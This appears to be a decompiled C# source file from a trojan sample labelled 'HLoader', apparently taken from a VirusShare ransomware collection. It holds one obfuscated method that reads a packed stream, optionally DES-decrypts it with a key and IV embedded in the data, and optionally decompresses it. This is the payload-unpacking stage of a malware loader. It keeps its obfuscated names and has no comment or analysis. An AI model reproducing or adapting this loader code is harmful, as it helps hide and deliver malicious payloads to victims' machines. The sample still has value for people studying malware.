// Decompiled with JetBrains decompiler
// Type: A.c39a15eff60f760c1db6ff3d247b1905c
// Assembly: HLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C828FA1-EFB7-4355-AAE8-0E5D4BCC5CDE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-2abbf3158922095236c02d05011b85e99d0d5bc519d4ee4d32c9d36be84cbd30.exe

using System;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;

namespace A
{
  internal sealed class c39a15eff60f760c1db6ff3d247b1905c
  {
    internal static byte[] c8ee680a7b8980553bc84da2842da9438(Stream _param0)
    {
      byte num1 = (byte) c35dc5becaa1d1810abcfee8ef2ade194.c51524f9fe9e0b8933f9d1c49ca790811((object) _param0);
      byte[] numArray1 = new byte[c733c2a7a2d8b9ff57c87e31c036bcbd6.c51524f9fe9e0b8933f9d1c49ca790811((object) _param0) - 1L];
      c4c32ce4a0b1b362583b80abbe105850e.c51524f9fe9e0b8933f9d1c49ca790811((object) _param0, numArray1, 0, numArray1.Length);
      if (((int) num1 & 1) != 0)
      {
        DESCryptoServiceProvider cryptoServiceProvider = c211e9c85d1918f1d11c77773f7a379d2.c5c2d9d521d5949d90f48b02be3c846f0();
        byte[] numArray2 = new byte[8];
        c6ef77fdecabfd0bafabbb70f929ca7c9.c5c2d9d521d5949d90f48b02be3c846f0((Array) numArray1, 0, (Array) numArray2, 0, 8);
        c35bfd0a6f42cd04cebfac539c8e5a6d3.c51524f9fe9e0b8933f9d1c49ca790811((object) cryptoServiceProvider, numArray2);
        byte[] numArray3 = new byte[8];
        c6ef77fdecabfd0bafabbb70f929ca7c9.c5c2d9d521d5949d90f48b02be3c846f0((Array) numArray1, 8, (Array) numArray3, 0, 8);
        bool flag = true;
        foreach (byte num2 in numArray3)
        {
          if (num2 != (byte) 0)
          {
            flag = false;
            break;
          }
        }
        if (flag)
          numArray3 = cd7ee1ae8278586eb01cc3d59eefc03c2.c51524f9fe9e0b8933f9d1c49ca790811((object) c4f52ac0c70425380ac6a2a2fd9a4a61a.c51524f9fe9e0b8933f9d1c49ca790811((object) cb61ff76d355f68337f28b45872bce660.c5c2d9d521d5949d90f48b02be3c846f0()));
        ca4e1de9c87c849c22069f9ce9ce4b356.c51524f9fe9e0b8933f9d1c49ca790811((object) cryptoServiceProvider, numArray3);
        numArray1 = cb4306ccb25c9b37320215d91feeff06c.c51524f9fe9e0b8933f9d1c49ca790811((object) c1fc665fbc0d846554fac598de4dcb155.c51524f9fe9e0b8933f9d1c49ca790811((object) cryptoServiceProvider), numArray1, 16, numArray1.Length - 16);
      }
      if (((int) num1 & 2) != 0)
      {
        try
        {
          MemoryStream memoryStream1 = cf18f4fbede1643c7508c5b938e3a1497.c5c2d9d521d5949d90f48b02be3c846f0(numArray1);
          DeflateStream deflateStream = cee35d7cf4fbe59bfb5975eaba44a6767.c5c2d9d521d5949d90f48b02be3c846f0((Stream) memoryStream1, CompressionMode.Decompress);
          MemoryStream memoryStream2 = c0ac3ae13c9bf01656ed71d118025e80b.c5c2d9d521d5949d90f48b02be3c846f0((int) c733c2a7a2d8b9ff57c87e31c036bcbd6.c51524f9fe9e0b8933f9d1c49ca790811((object) memoryStream1) * 2);
          int length = 1000;
          byte[] numArray4 = new byte[length];
          int num3;
          do
          {
            num3 = c4c32ce4a0b1b362583b80abbe105850e.c51524f9fe9e0b8933f9d1c49ca790811((object) deflateStream, numArray4, 0, length);
            if (num3 > 0)
              c5de1ddffda58cba3d093374b0a0db8f5.c51524f9fe9e0b8933f9d1c49ca790811((object) memoryStream2, numArray4, 0, num3);
          }
          while (num3 >= length);
          numArray1 = ccf39cd881adc31857e79d95624f3204f.c51524f9fe9e0b8933f9d1c49ca790811((object) memoryStream2);
        }
        catch (Exception ex)
        {
        }
      }
      return numArray1;
    }
  }
}
